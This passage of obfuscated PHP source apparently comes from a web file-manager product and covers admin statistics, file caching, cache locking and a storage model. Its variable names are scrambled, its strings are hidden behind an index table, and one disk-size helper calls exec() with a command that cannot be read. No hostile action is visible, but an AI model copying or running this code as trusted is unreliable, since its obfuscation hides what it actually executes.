$Ï¾€Á¨é[] = $Ãñ”åè; } $ĞÃĞ¼ŒŞ = $Ï¾€Á¨é; } $º†ÆüË = array($¦ä‰ğˆ€[609] => array($¦ä‰ğˆ€[763] => LNG($¦ä‰ğˆ€[1795]), $¦ä‰ğˆ€[1779] => LNG($¦ä‰ğˆ€[1796]), $¦ä‰ğˆ€[1780] => LNG($¦ä‰ğˆ€[1797])), $¦ä‰ğˆ€[1781] => array($¦ä‰ğˆ€[761] => LNG($¦ä‰ğˆ€[1798]), $¦ä‰ğˆ€[1783] => LNG($¦ä‰ğˆ€[1799]), $¦ä‰ğˆ€[1784] => LNG($¦ä‰ğˆ€[1800]), $¦ä‰ğˆ€[1785] => LNG($¦ä‰ğˆ€[1801]))); $¡Ôü¯Õ” = array($¦ä‰ğˆ€[609] => $¦ä‰ğˆ€[1802], $¦ä‰ğˆ€[1781] => $¦ä‰ğˆ€[86]); if (empty($ĞÃĞ¼ŒŞ)) { $ ¹ÄüçÛ = date($¦ä‰ğˆ€[1786], strtotime($¦ä‰ğˆ€[1787])); $âÁóÉğ = array($¦ä‰ğˆ€[234] => $ ¹ÄüçÛ); foreach ($º†ÆüË[$Ùóª±±‚] as $şè×¥ûÜ => $åï‚ÑŞ‡) { $âÁóÉğ[$şè×¥ûÜ] = 0; } $ĞÃĞ¼ŒŞ[] = $âÁóÉğ; } $¡â›éïÛ = array(); foreach ($ĞÃĞ¼ŒŞ as $åï‚ÑŞ‡) { if ($Ùóª±±‚ == $¦ä‰ğˆ€[1781] && $åï‚ÑŞ‡[$¦ä‰ğˆ€[1783]] > $åï‚ÑŞ‡[$¦ä‰ğˆ€[761]]) { $åï‚ÑŞ‡[$¦ä‰ğˆ€[1783]] = $åï‚ÑŞ‡[$¦ä‰ğˆ€[761]]; } foreach ($º†ÆüË[$Ùóª±±‚] as $şè×¥ûÜ => $½­‰³ôô) { $Ãñ”åè = array($¦ä‰ğˆ€[234] => $åï‚ÑŞ‡[$¦ä‰ğˆ€[234]], $¦ä‰ğˆ€[1559] => $½­‰³ôô); $Ãñ”åè[$¡Ôü¯Õ”[$Ùóª±±‚]] = isset($åï‚ÑŞ‡[$şè×¥ûÜ]) ? $åï‚ÑŞ‡[$şè×¥ûÜ] : 0; $¡â›éïÛ[] = $Ãñ”åè; } } return $¡â›éïÛ; } public function validDate($¢‹¾ã¾, $çÍşÈ®) { $¥›è’ñ =& $_SERVER[¹Û¹Æ€]; $õ©Ë¥İï = date($¥›è’ñ[1786], strtotime($¥›è’ñ[1787])); $¡Ä‰Àºˆ = array($õ©Ë¥İï); switch ($¢‹¾ã¾) { case $¥›è’ñ[1639]: $éÂäÎù = mktime(0, 0, 0, date($¥›è’ñ[1803]), date($¥›è’ñ[1381]) - date($¥›è’ñ[1444]) + 7 - 7, date($¥›è’ñ[1804])); $¥¦³Ô¦‚ = 0; do { $‘ü—Äå½ = date($¥›è’ñ[1786], $éÂäÎù - 3600 * 24 * 7 * $¥¦³Ô¦‚); $¡Ä‰Àºˆ[] = $‘ü—Äå½; $¥¦³Ô¦‚++; } while ($çÍşÈ® < $‘ü—Äå½); break; case $¥›è’ñ[1637]: $¥¦³Ô¦‚ = 1; do { $„Àª’ÏÏ = date($¥›è’ñ[1805], strtotime("\55\40{$¥¦³Ô¦‚}\x20\155\x6f\x6e\164\150\163")); $¡Ä‰Àºˆ[] = $„Àª’ÏÏ; $¥¦³Ô¦‚++; } while ($çÍşÈ® < $„Àª’ÏÏ); break; case $¥›è’ñ[1806]: $Ğõ´ù¼µ = (int) date($¥›è’ñ[1804], strtotime($çÍşÈ®)); $¤ô½…ßş = (int) date($¥›è’ñ[1804]); if ($Ğõ´ù¼µ >= $¤ô½…ßş) { break; } for ($Ğõ´ù¼µ; $Ğõ´ù¼µ < $¤ô½…ßş; $Ğõ´ù¼µ++) { $¡Ä‰Àºˆ[] = $Ğõ´ù¼µ . $¥›è’ñ[1807]; } break; default: break; } if ($çÍşÈ® > end($¡Ä‰Àºˆ)) { array_pop($¡Ä‰Àºˆ); } sort($¡Ä‰Àºˆ); return $¡Ä‰Àºˆ; } public function listTable($ñ™Àµô¿) { $“‡•µä® = ucfirst($ñ™Àµô¿); return Model($“‡•µä®)->listData(); } public function option($ğÛöœ¹ë) { $Ü­ã™Æ = $_SERVER[¹Û¹Æ€][1808] . ucfirst($ğÛöœ¹ë); return $this->{$Ü­ã™Æ}(); } private function optionUser() { $½â®æ’’ =& $_SERVER[¹Û¹Æ€]; $µĞ›‚É‘ = Model($½â®æ’’[544])->count($½â®æ’’[1659]); $ÊĞ°ß¹ñ = Model($½â®æ’’[544])->where($½â®æ’’[1809])->count($½â®æ’’[1659]); $ŠÍË÷Œ = intval($GLOBALS[$½â®æ’’[16]][$½â®æ’’[358]][$½â®æ’’[1614]]) / 3600; $ÈÍÄôìî = strtotime("\55{$ŠÍË÷Œ}\40\x68\157\165\162\163"); $›ğÊîÔñ = strtotime(date($½â®æ’’[1790])); if ($ÈÍÄôìî < $›ğÊîÔñ) { $ÈÍÄôìî = $›ğÊîÔñ; } $Ä·‰¼¶¼ = array($½â®æ’’[1810] => array($½â®æ’’[1011], $ÈÍÄôìî)); $„Üò°åó = (int) Model($½â®æ’’[544])->where($Ä·‰¼¶¼)->count($½â®æ’’[1659]); if (!$„Üò°åó) { $„Üò°åó = 1; } $Ä·‰¼¶¼ = array($½â®æ’’[1810] => array($½â®æ’’[1011], $›ğÊîÔñ)); $£é•Î‹Ÿ = Model($½â®æ’’[544])->where($Ä·‰¼¶¼)->count($½â®æ’’[1659]); return array($½â®æ’’[757] => (int) $µĞ›‚É‘, $½â®æ’’[1811] => (int) ($µĞ›‚É‘ - $ÊĞ°ß¹ñ), $½â®æ’’[1812] => (int) $ÊĞ°ß¹ñ, $½â®æ’’[1813] => (int) $£é•Î‹Ÿ, $½â®æ’’[1814] => $„Üò°åó); } private function optionFile() { $ôë”ûñÚ =& $_SERVER[¹Û¹Æ€]; $âÑ²ÃÊå = $this->sourceSize(); $âŞÓÈ€Å = $âÑ²ÃÊå[$ôë”ûñÚ[86]]; $ï¹ê¤ı± = $âÑ²ÃÊå[$ôë”ûñÚ[1783]]; $Ä É‚¿ú = Model($ôë”ûñÚ[823])->where(array($ôë”ûñÚ[419] => 0))->count($ôë”ûñÚ[411]); $‹ä—·üµ = array($ôë”ûñÚ[419] => 0, $ôë”ûñÚ[210] => array($ôë”ûñÚ[1011], strtotime(date($ôë”ûñÚ[1790])))); $ãÙ®ÈÂí = Model($ôë”ûñÚ[823])->where($‹ä—·üµ)->sum($ôë”ûñÚ[86]); $¤Ôúõ’€ = Model($ôë”ûñÚ[823])->where($‹ä—·üµ)->count($ôë”ûñÚ[411]); return array($ôë”ûñÚ[761] => $âŞÓÈ€Å, $ôë”ûñÚ[1783] => $ï¹ê¤ı±, $ôë”ûñÚ[1815] => $âŞÓÈ€Å - $ï¹ê¤ı±, $ôë”ûñÚ[1816] => (int) $ãÙ®ÈÂí, $ôë”ûñÚ[763] => (int) $Ä É‚¿ú, $ôë”ûñÚ[1817] => (int) $¤Ôúõ’€); } private function optionAccess() { $µ¬‚£ˆ© =& $_SERVER[¹Û¹Æ€]; return array($µ¬‚£ˆ©[757] => $this->typeLogCnt(), $µ¬‚£ˆ©[117] => $this->typeLogCnt($µ¬‚£ˆ©[117]), $µ¬‚£ˆ©[461] => $this->typeLogCnt($µ¬‚£ˆ©[461]), $µ¬‚£ˆ©[1818] => $this->typeLogCnt($µ¬‚£ˆ©[1818]), $µ¬‚£ˆ©[1819] => $this->typeLogCnt($µ¬‚£ˆ©[1819]), $µ¬‚£ˆ©[609] => $this->typeLogCnt($µ¬‚£ˆ©[22], $µ¬‚£ˆ©[1794])); } private function typeLogCnt($¢ªÂ›ß¥ = '', $ïá×ã¹¿ = "\x69\144") { $ÎÛûÎ¬Í =& $_SERVER[¹Û¹Æ€]; $Û¸û§ºæ = array($ÎÛûÎ¬Í[117] => array($ÎÛûÎ¬Í[1820], $ÎÛûÎ¬Í[1821]), $ÎÛûÎ¬Í[461] => array($ÎÛûÎ¬Í[1822], $ÎÛûÎ¬Í[1823]), $ÎÛûÎ¬Í[1818] => array($ÎÛûÎ¬Í[1824], $ÎÛûÎ¬Í[1825], $ÎÛûÎ¬Í[1826]), $ÎÛûÎ¬Í[1819] => array($ÎÛûÎ¬Í[1827], $ÎÛûÎ¬Í[1828]), $ÎÛûÎ¬Í[1829] => array($ÎÛûÎ¬Í[1830], $ÎÛûÎ¬Í[1831], $ÎÛûÎ¬Í[1832])); $ˆ©¨íô¤ = strtotime(date($ÎÛûÎ¬Í[1790])); $ß ÖâËÒ = array($ÎÛûÎ¬Í[210] => array($ÎÛûÎ¬Í[1011], $ˆ©¨íô¤)); if ($¢ªÂ›ß¥) { $ß ÖâËÒ[$ÎÛûÎ¬Í[43]] = array($ÎÛûÎ¬Í[17], $Û¸û§ºæ[$¢ªÂ›ß¥]); } $ÇŒ°¿È° = Model($ÎÛûÎ¬Í[1793])->where($ß ÖâËÒ)->count($ïá×ã¹¿); return (int) $ÇŒ°¿È°; } private function optionServer() { $¬çƒä€Ø =& $_SERVER[¹Û¹Æ€]; $¤¥×‡³§ = $this->diskDriver(); $©ÌôÁÒÛ = KodIO::defaultDriver(); $èë ¥«ü = array($¬çƒä€Ø[815] => $©ÌôÁÒÛ[$¬çƒä€Ø[408]]); $Ë‡¥¯ÒŠ = Model($¬çƒä€Ø[480])->where($èë ¥«ü)->sum($¬çƒä€Ø[86]); $¯¹ì£à‰ = explode($¬çƒä€Ø[63], $_SERVER[$¬çƒä€Ø[153]]); $ğ’ÜÄú = $¯¹ì£à‰[0]; $úïãøçÔ = $GLOBALS[$¬çƒä€Ø[16]][$¬çƒä€Ø[31]]; $İ•Œê¸” = $úïãøçÔ[$¬çƒä€Ø[973]]; if ($İ•Œê¸” == $¬çƒä€Ø[961]) { $šå†¢ö¸ = explode($¬çƒä€Ø[1277], $úïãøçÔ[$¬çƒä€Ø[972]]); $İ•Œê¸” = $šå†¢ö¸[0]; } if ($İ•Œê¸” == $¬çƒä€Ø[909] || $İ•Œê¸” == $¬çƒä€Ø[802]) { $½…¡‰… = Model()->db()->query($¬çƒä€Ø[1833]); $¼¿±ÇäŞ = $½…¡‰…[0] && isset($½…¡‰…[0][$¬çƒä€Ø[1558]]) ? $½…¡‰…[0][$¬çƒä€Ø[1558]] : 0; $İ•Œê¸” = $¬çƒä€Ø[1834] . ($¼¿±ÇäŞ ? $¬çƒä€Ø[18] . $¼¿±ÇäŞ : $¬çƒä€Ø[22]); } $ô­ „ÍÔ = $GLOBALS[$¬çƒä€Ø[16]][$¬çƒä€Ø[358]][$¬çƒä€Ø[825]]; return array($¬çƒä€Ø[1835] => $¤¥×‡³§ ? $¤¥×‡³§[$¬çƒä€Ø[1836]] : 0, $¬çƒä€Ø[1837] => $¤¥×‡³§ ? $¤¥×‡³§[$¬çƒä€Ø[1838]] : 0, $¬çƒä€Ø[1839] => (int) $©ÌôÁÒÛ[$¬çƒä€Ø[1836]] * 1024 * 1024 * 1024, $¬çƒä€Ø[1840] => (int) $Ë‡¥¯ÒŠ, $¬çƒä€Ø[1841] => ucfirst($ğ’ÜÄú), $¬çƒä€Ø[1842] => $¬çƒä€Ø[1843] . PHP_VERSION, $¬çƒä€Ø[1844] => phpBuild64() ? 64 : 32, $¬çƒä€Ø[756] => str_replace($¬çƒä€Ø[1127], $¬çƒä€Ø[989], $İ•Œê¸”), $¬çƒä€Ø[358] => ucfirst($ô­ „ÍÔ), $¬çƒä€Ø[42] => $_SERVER[$¬çƒä€Ø[1845]]); } private function diskDriver() { $è·ı¯ñû =& $_SERVER[¹Û¹Æ€]; $…àô¢·Õ = $è·ı¯ñû[18]; $–È¸Õ­ = $GLOBALS[$è·ı¯ñû[16]][$è·ı¯ñû[1294]] == $è·ı¯ñû[1295]; if ($–È¸Õ­) { $…àô¢·Õ = $è·ı¯ñû[1846]; if (function_exists($è·ı¯ñû[1847])) { exec($è·ı¯ñû[1848], $ıè°©´ø); $…àô¢·Õ = $ıè°©´ø[1] . $è·ı¯ñû[18]; } } if (!file_exists($…àô¢·Õ)) { return; } $ïŒêÇÇ‰ = @disk_total_space($…àô¢·Õ); $‹Ï±ÎÜü = $ïŒêÇÇ‰ - @disk_free_space($…àô¢·Õ); return array($è·ı¯ñû[1836] => $ïŒêÇÇ‰, $è·ı¯ñû[1838] => $‹Ï±ÎÜü); } public function fileChart($±ÉŞ”ïÆ) { $Åû§Ãî† =& $_SERVER[¹Û¹Æ€]; if (isset($±ÉŞ”ïÆ[$Åû§Ãî†[1659]])) { return Model($Åû§Ãî†[823])->userFileTypeProfile($±ÉŞ”ïÆ[$Åû§Ãî†[1659]]); } if (isset($±ÉŞ”ïÆ[$Åû§Ãî†[1849]])) { return Model($Åû§Ãî†[823])->groupFileTypeProfile($±ÉŞ”ïÆ[$Åû§Ãî†[1849]]); } $¾ï­§‡š = $this->sourceSize(); $ÃòŞ¬ö = array($Åû§Ãî†[441] => 0, $Åû§Ãî†[420] => 1); $©ïÔ‘É = Model($Åû§Ãî†[823])->where($ÃòŞ¬ö)->sum($Åû§Ãî†[86]); $ÃòŞ¬ö[$Åû§Ãî†[420]] = 2; $áè“Öâê = Model($Åû§Ãî†[823])->where($ÃòŞ¬ö)->sum($Åû§Ãî†[86]); return array($Åû§Ãî†[761] => $¾ï­§‡š[$Åû§Ãî†[86]], $Åû§Ãî†[1783] => $¾ï­§‡š[$Åû§Ãî†[1783]], $Åû§Ãî†[1784] => (int) $©ïÔ‘É, $Åû§Ãî†[1785] => (int) $áè“Öâê); } private function sourceSize() { $«…£Ï°™ =& $_SERVER[¹Û¹Æ€]; $¯„èËİ¾ = Model($«…£Ï°™[823])->where(array($«…£Ï°™[419] => 0))->sum($«…£Ï°™[86]); $ú¢Šİ¿Œ = Model($«…£Ï°™[480])->sum($«…£Ï°™[86]); if ($ú¢Šİ¿Œ > $¯„èËİ¾) { $ú¢Šİ¿Œ = $¯„èËİ¾; } return array($«…£Ï°™[86] => (int) $¯„èËİ¾, $«…£Ï°™[1783] => (int) $ú¢Šİ¿Œ); } } goto D½¥¿ªÅà; e‹‡‰±¡™×: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¤ó³Óîî, $‚†ƒ¹ø) { $ıË ×° =& $_SERVER[¹Û¹Æ€]; $this->cachePath = $¤ó³Óîî[$ıË ×°[94]]; $this->prefix = $ıË ×°[832]; $this->cacheTime = $‚†ƒ¹ø; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($·ë°•®‘) { $º¡Å°ÉÚ =& $_SERVER[¹Û¹Æ€]; $·ë°•®‘ = str_replace(array($º¡Å°ÉÚ[833], $º¡Å°ÉÚ[107], $º¡Å°ÉÚ[83]), $º¡Å°ÉÚ[834], $·ë°•®‘); return $this->cachePath . $º¡Å°ÉÚ[835] . $·ë°•®‘ . $º¡Å°ÉÚ[836]; } public function set($Ñ§¸Ø÷à, $Œ²ÓÚğ», $Ğµ•É„¸ = false) { $Ğµ•É„¸ = $Ğµ•É„¸ ? $Ğµ•É„¸ : $this->cacheTime; $°•øÍšÌ = $this->getFile($Ñ§¸Ø÷à); if (file_put_contents($°•øÍšÌ, $this->prefix . $Œ²ÓÚğ», LOCK_EX)) { @touch($°•øÍšÌ, intval(time() + $Ğµ•É„¸)); clearstatcache(); return !0; } @unlink($°•øÍšÌ); return !1; } public function get($§Ê´Øãà) { $™ÖÚ¯Ò = $this->getFile($§Ê´Øãà); if (file_exists($™ÖÚ¯Ò) && filemtime($™ÖÚ¯Ò) < time()) { @unlink($™ÖÚ¯Ò); return !1; } $şı‘¥‡ = @file_get_contents($™ÖÚ¯Ò); return substr($şı‘¥‡, strlen($this->prefix)); } public function remove($½Ø“ÓÜ) { $âÄó­ÙŒ = $this->getFile($½Ø“ÓÜ); return @unlink($âÄó­ÙŒ); } public function deleteAll() { $ ‡—ûØã =& $_SERVER[¹Û¹Æ€]; $ÓÚ±ı  = scandir($this->cachePath); foreach ($ÓÚ±ı  as $¹—·Ëİ¼) { $üÆ±Ï° = $this->cachePath . $¹—·Ëİ¼; if (strpos($üÆ±Ï°, $ ‡—ûØã[836]) && strpos($üÆ±Ï°, $ ‡—ûØã[837])) { @unlink($üÆ±Ï°); } } } public function clearTimeout() { $öÆÍìÔî =& $_SERVER[¹Û¹Æ€]; $–Œ®õì¨ = scandir($this->cachePath); foreach ($–Œ®õì¨ as $éÀ•˜¸ı) { $˜ŠĞ¯‡ğ = $this->cachePath . $éÀ•˜¸ı; if (strpos($˜ŠĞ¯‡ğ, $öÆÍìÔî[836]) && strpos($˜ŠĞ¯‡ğ, $öÆÍìÔî[837]) && filemtime($˜ŠĞ¯‡ğ) < time()) { @unlink($˜ŠĞ¯‡ğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $èíô–’ =& $_SERVER[¹Û¹Æ€]; if (self::$handle) { return self::$handle; } $Ğüİ·Å = $GLOBALS[$èíô–’[16]][$èíô–’[358]]; self::$timeout = $Ğüİ·Å[$èíô–’[838]] ? $Ğüİ·Å[$èíô–’[838]] : 10; $İ¯æ˜ƒ® = _get($GLOBALS[$èíô–’[16]], $èíô–’[839]); $Ó˜êÜµ = $Ğüİ·Å[$èíô–’[825]] ? $Ğüİ·Å[$èíô–’[825]] : $èíô–’[209]; if ($Ó˜êÜµ == $èíô–’[31] && $İ¯æ˜ƒ® == $èíô–’[23]) { $Ó˜êÜµ = $èíô–’[209]; } switch ($Ó˜êÜµ) { case $èíô–’[828]: self::$handle = new CacheLockRedis(); break; case $èíô–’[829]: self::$handle = new CacheLockMemcached(); break; case $èíô–’[31]: self::$handle = new CacheLockDatabase(); break; case $èíô–’[209]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($èíô–’[840], $èíô–’[841]); } return self::$handle; } private static function key($ıÓ¶®Š) { return $_SERVER[¹Û¹Æ€][842] . Cache::key($ıÓ¶®Š); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ôœ×¹ç = '') { self::$errorMsg = $ôœ×¹ç; } public static function lockGlobal($º¥ØÏ¬…, $»ˆ§„ÒŠ) { return self::lock($º¥ØÏ¬…, $»ˆ§„ÒŠ, !0); } public static function lock($ĞÃ«‘‡å, $®ã©ªó§ = false, $î©ÃÊï“ = false) { $È§¯¸é =& $_SERVER[¹Û¹Æ€]; $¥ğÆª¾ = self::init(); $€ëïÈƒÌ = self::key($ĞÃ«‘‡å); $®ã©ªó§ = $®ã©ªó§ ? $®ã©ªó§ : self::$timeout; $ğ³ºÜ¢î = timeFloat(); $Á£“ñ¡ = $¥ğÆª¾->lock($€ëïÈƒÌ, $®ã©ªó§); $ÕĞÁ™åÔ = timeFloat(); if (!$Á£“ñ¡) { $Ğ¥ß•Æ± = "\154\x6f\x63\153\40\145\162\162\157\162\x3b\x6b\x65\x79\x3d{$ĞÃ«‘‡å}\73\164\x69\155\145\x3d{$®ã©ªó§}\73" . self::$errorMsg . $È§¯¸é[81] . get_caller_msg(); $­óÓÚ´À = LNG($È§¯¸é[843]) . "\x28{$®ã©ªó§}\x73\51\x2e" . LNG($È§¯¸é[844]); $­óÓÚ´À .= $È§¯¸é[845]; if (is_string(self::$errorMsg) && self::$errorMsg) { $­óÓÚ´À = $­óÓÚ´À . $È§¯¸é[846] . self::$errorMsg; } write_log($È§¯¸é[847] . sprintf($È§¯¸é[848], timeFloat() - $ğ³ºÜ¢î) . $È§¯¸é[849] . $Ğ¥ß•Æ± . $È§¯¸é[850] . error_get_last(), $È§¯¸é[841]); show_json($­óÓÚ´À, !1); } if (!$î©ÃÊï“) { self::$lockItem[$€ëïÈƒÌ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $åú¦“¯§ = number_format(timeFloat() - $ÕĞÁ™åÔ, 3); write_log($È§¯¸é[851] . $ĞÃ«‘‡å . $È§¯¸é[852] . $åú¦“¯§, $È§¯¸é[841]); } return $Á£“ñ¡; } public static function lockGet($›ùÜ›Ğä) { $§Ù‹û£ = self::key($›ùÜ›Ğä); if (self::$lockItem[$§Ù‹û£]) { return self::$lockItem[$§Ù‹û£]; } return self::init()->lockGet($§Ù‹û£); } public static function unlock($•íÃé‡İ) { $õŞÎûµ– =& $_SERVER[¹Û¹Æ€]; $œÌ´Şª‘ = self::key($•íÃé‡İ); self::$lockItem[$œÌ´Şª‘] = null; self::init()->unlock($œÌ´Şª‘); if (GLOBAL_DEBUG_LOG_ALL) { write_log($õŞÎûµ–[853] . $•íÃé‡İ, $õŞÎûµ–[841]); } return; } public static function unlockRuntime() { $¸øœ¨šÏ =& $_SERVER[¹Û¹Æ€]; $Ñœ­î¦ = self::init(); $¨ªÊ„ = !1; foreach (self::$lockItem as $ØÅºÑŠµ => $Ä¿‹Í®¬) { if (!$Ä¿‹Í®¬) { continue; } $Ñœ­î¦->unlock($ØÅºÑŠµ); if (!$¨ªÊ„) { $¨ªÊ„ = !0; write_log($¸øœ¨šÏ[854] . $ØÅºÑŠµ . $¸øœ¨šÏ[81] . get_caller_msg(), $¸øœ¨šÏ[841]); continue; } write_log($¸øœ¨šÏ[854] . $ØÅºÑŠµ, $¸øœ¨šÏ[841]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¨ƒú·èé = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¸øœ¨šÏ[855] . $¨ƒú·èé . $¸øœ¨šÏ[856] . ACTION, $¸øœ¨šÏ[841]); } } public static function fileLock($æ€õ­Ï„) { $ÇÜ‰ÌÓ¬ =& $_SERVER[¹Û¹Æ€]; if (!$GLOBALS[$ÇÜ‰ÌÓ¬[857]]) { $GLOBALS[$ÇÜ‰ÌÓ¬[857]] = array(); } $GLOBALS[$ÇÜ‰ÌÓ¬[857]][$æ€õ­Ï„] = !1; $­‰«şƒ = fopen(DATA_PATH . $æ€õ­Ï„ . $ÇÜ‰ÌÓ¬[858], $ÇÜ‰ÌÓ¬[859]); if (!$­‰«şƒ) { return !1; } $GLOBALS[$ÇÜ‰ÌÓ¬[857]][$æ€õ­Ï„] = $­‰«şƒ; if (flock($­‰«şƒ, LOCK_EX)) { return !0; } self::unlock($æ€õ­Ï„); show_json($ÇÜ‰ÌÓ¬[860], !1); return !1; } public static function fileUnlock($½şœæ¾Ç) { $“İıÚÃ® =& $_SERVER[¹Û¹Æ€]; $ô¥ø’ò = $GLOBALS[$“İıÚÃ®[857]][$½şœæ¾Ç]; if (!$ô¥ø’ò) { return; } $GLOBALS[$“İıÚÃ®[857]][$½şœæ¾Ç] = !1; flock($ô¥ø’ò, LOCK_UN); fclose($ô¥ø’ò); } public static function fileUnlockAll() { $Ì›¼Ş‡ß =& $_SERVER[¹Û¹Æ€]; if (!$GLOBALS[$Ì›¼Ş‡ß[857]]) { return; } foreach ($GLOBALS[$Ì›¼Ş‡ß[857]] as $Òê©­°– => $ıã˜Œ–¼) { if (!$ıã˜Œ–¼) { continue; } $GLOBALS[$Ì›¼Ş‡ß[857]][$Òê©­°–] = !1; flock($ıã˜Œ–¼, LOCK_UN); fclose($ıã˜Œ–¼); } $GLOBALS[$Ì›¼Ş‡ß[857]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto b‹Á¤Ëå—; bê°¢ºí…°: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x73\x74\157\162\x61\147\145\x4c\151\163\164"; public $field = array("\156\141\155\145", "\x73\x69\172\145\x4d\x61\170", "\163\171\x73\164\145\x6d", "\x64\145\146\x61\165\x6c\x74", "\144\162\151\166\145\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($ë»õºæ = false, $‹˜²‹¼Ø = "\155\157\x64\x69\146\171\124\x69\x6d\145", $€ü‘°ˆï = false) { $‡™äêù =& $_SERVER[¹Û¹Æ€]; $Àñ®Õ½ğ = parent::listData($ë»õºæ, $‹˜²‹¼Ø, $€ü‘°ˆï); if ($ë»õºæ) { return $Àñ®Õ½ğ; } $‡¾êÓ¤Ù = $this->ioSizeUseGet(array_to_keyvalue($Àñ®Õ½ğ, $‡™äêù[22], $‡™äêù[408])); foreach ($Àñ®Õ½ğ as $òÙ©ì¨ğ => $İ¬ö¨ğü) { unset($Àñ®Õ½ğ[$òÙ©ì¨ğ][$‡™äêù[16]]); $Àñ®Õ½ğ[$òÙ©ì¨ğ][$‡™äêù[1838]] = isset($‡¾êÓ¤Ù[$İ¬ö¨ğü[$‡™äêù[408]]]) ? $‡¾êÓ¤Ù[$İ¬ö¨ğü[$‡™äêù[408]]] : 0; } return $Àñ®Õ½ğ; } public function ioSizeUseGet($•ûæİ™­) { $í¹‹‡“ =& $_SERVER[¹Û¹Æ€]; if (!$•ûæİ™­) { return array(); } $˜‘£øÅ = $í¹‹‡“[2161] . implode($í¹‹‡“[60], $•ûæİ™­); $†Ö§º°Â = Cache::get($˜‘£øÅ); if ($†Ö§º°Â) { return $†Ö§º°Â; } $àìßâô = array($í¹‹‡“[815] => $í¹‹‡“[408], $í¹‹‡“[2162] => $í¹‹‡“[86]); $Ì®Èı¡‰ = array($í¹‹‡“[815] => array($í¹‹‡“[17], $•ûæİ™­)); $†Ö§º°Â = Model($í¹‹‡“[787])->field($àìßâô)->where($Ì®Èı¡‰)->group($í¹‹‡“[815])->select(); $†Ö§º°Â = array_to_keyvalue($†Ö§º°Â, $í¹‹‡“[408], $í¹‹‡“[86]); Cache::set($˜‘£øÅ, $†Ö§º°Â, 600); return $†Ö§º°Â; } public function getConfig($ûƒ¥®œµ) { $’‘¿ÏÇ¸ = parent::listData($ûƒ¥®œµ); return json_decode($’‘¿ÏÇ¸[$_SERVER[¹Û¹Æ€][16]], !0); } public function update($ëØĞò™, $ÂŞõÖå·) { $ìƒ¯µÃ§ =& $_SERVER[¹Û¹Æ€]; $¥¯ò›×æ = $ÂŞõÖå·[$ìƒ¯µÃ§[42]]; $üŞöÚ•Š = array_to_keyvalue(parent::listData(), $ìƒ¯µÃ§[42]); if (isset($üŞöÚ•Š[$¥¯ò›×æ]) && $üŞöÚ•Š[$¥¯ò›×æ][$ìƒ¯µÃ§[408]] != $ëØĞò™) { return !1; } $this->checkPwd($ëØĞò™, $ÂŞõÖå·); if (isset($ÂŞõÖå·[$ìƒ¯µÃ§[2163]]) && $ÂŞõÖå·[$ìƒ¯µÃ§[2163]] == $ìƒ¯µÃ§[98]) { $this->checkConfig($ÂŞõÖå·); } unset($ÂŞõÖå·[$ìƒ¯µÃ§[2163]]); $š³÷Ÿ…ª = parent::update($ëØĞò™, $ÂŞõÖå·); if ($š³÷Ÿ…ª && $ÂŞõÖå·[$ìƒ¯µÃ§[47]]) { $û„ìîâú = 0; foreach ($üŞöÚ•Š as $ÂÜê˜Ô’) { if ($ÂÜê˜Ô’[$ìƒ¯µÃ§[47]] && $ÂÜê˜Ô’[$ìƒ¯µÃ§[408]] != $ëØĞò™) { $û„ìîâú = $ÂÜê˜Ô’[$ìƒ¯µÃ§[408]]; parent::update($ÂÜê˜Ô’[$ìƒ¯µÃ§[408]], array($ìƒ¯µÃ§[47] => 0)); } } $this->updateBackup($ëØĞò™, $û„ìîâú); } return $š³÷Ÿ…ª; } public function add($Õ›¦Ïù) { $´éÕ€³õ =& $_SERVER[¹Û¹Æ€]; $ñ·¼òè³ = array_to_keyvalue(parent::listData(), $´éÕ€³õ[42]); if (isset($ñ·¼òè³[$Õ›¦Ïù[$´éÕ€³õ[42]]])) { return !1; } $this->checkConfig($Õ›¦Ïù); $ÒÙÛÔ­ø = parent::insert($Õ›¦Ïù); if ($ÒÙÛÔ­ø && $Õ›¦Ïù[$´éÕ€³õ[47]]) { foreach ($ñ·¼òè³ as $§ÁÃ”Ó) { if ($§ÁÃ”Ó[$´éÕ€³õ[47]]) { parent::update($§ÁÃ”Ó[$´éÕ€³õ[408]], array($´éÕ€³õ[47] => 0)); } } } return $ÒÙÛÔ­ø; } public function updateBackup($ ¦©ÊÚÛ, $¬óá”é¸) { $Ò¦³‰Ç =& $_SERVER[¹Û¹Æ€]; if (!$¬óá”é¸) { return; } $Ü×˜àÔ = Model($Ò¦³‰Ç[747])->config(); if ($Ü×˜àÔ[$Ò¦³‰Ç[1629]] != $Ò¦³‰Ç[98] || $Ü×˜àÔ[$Ò¦³‰Ç[750]] != $¬óá”é¸) { return; } $ ¿ÉÖÑ˜ = Model($Ò¦³‰Ç[768])->get($Ò¦³‰Ç[778]); $ ¿ÉÖÑ˜ = json_decode($ ¿ÉÖÑ˜, !0); if (!$ ¿ÉÖÑ˜) { return; } $ ¿ÉÖÑ˜[$Ò¦³‰Ç[750]] = $ ¦©ÊÚÛ; Model($Ò¦³‰Ç[768])->set(array($Ò¦³‰Ç[778] => $ ¿ÉÖÑ˜)); } public function checkPwd($‚Ş™Ë‘Á, &$èåĞ¦”Ö) { $Œï†Ó˜Ã =& $_SERVER[¹Û¹Æ€]; if (empty($èåĞ¦”Ö[$Œï†Ó˜Ã[16]])) { return; } $î¢…ê„– = json_decode($èåĞ¦”Ö[$Œï†Ó˜Ã[16]], !0); $ƒ„¥Ìƒ = $Œï†Ó˜Ã[22]; $€£·Å¡Ã = array($Œï†Ó˜Ã[2164], $Œï†Ó˜Ã[2165], $Œï†Ó˜Ã[886]); foreach ($€£·Å¡Ã as $ñøóÚ±Ì) { if (isset($î¢…ê„–[$ñøóÚ±Ì])) { $ƒ„¥Ìƒ = $ñøóÚ±Ì; break; } } if (!$ƒ„¥Ìƒ) { return; } $ÆÎ„æª = $this->getConfig($‚Ş™Ë‘Á); 